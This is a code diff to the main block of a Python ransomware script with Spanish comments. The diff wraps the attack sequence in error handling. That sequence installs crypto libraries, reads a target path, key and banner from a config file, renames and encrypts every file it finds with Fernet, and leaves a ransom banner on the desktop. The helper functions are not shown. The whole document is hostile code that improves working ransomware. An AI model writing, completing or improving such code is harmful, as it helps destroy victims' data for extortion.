@@ -45,18 +45,23 @@ def create_banner(banner):
         write_file.write(banner)
 
 if __name__=="__main__":
-    #Instala las librerias necesarias para cifrar los archivos.
-    install_lib()
-    from cryptography.fernet import Fernet
-    #Recuperamos los parametros de data_ransomware.txt. 
-    path, key, banner = get_parameters()
-    #Averiguamos los path de cada archivo desde el directorio indicado.
-    files_path = get_path_files(path)
-    #Cambiamos las extensiones de los archivos para modificarlos de una forma mas sencilla.
-    change_files_name(files_path)
-    #Volvemos a recuperar el path y nombres de archivo ya que los hemos modificado.
-    files_path = get_path_files(path)
-    #Ciframos los archivos con la clave aportada.
-    encrypt_files(files_path, key)
-    #Creamos un banner del ataque en el escritorio.
-    create_banner(banner)
+    try:
+        #Instala las librerias necesarias para cifrar los archivos.
+        install_lib()
+        from cryptography.fernet import Fernet
+        #Recuperamos los parametros de data_ransomware.txt. 
+        path, key, banner = get_parameters()
+        #Averiguamos los path de cada archivo desde el directorio indicado.
+        files_path = get_path_files(path)
+        #Cambiamos las extensiones de los archivos para modificarlos de una forma mas sencilla.
+        change_files_name(files_path)
+        #Volvemos a recuperar el path y nombres de archivo ya que los hemos modificado.
+        files_path = get_path_files(path)
+        #Ciframos los archivos con la clave aportada.
+        encrypt_files(files_path, key)
+        #Creamos un banner del ataque en el escritorio.
+        create_banner(banner)
+    except: 
+        print("Algo ha fallado.")
+        print("Comprueba los parametros introducidos en el data_ransomware.txt.")
+        print(TypeError)
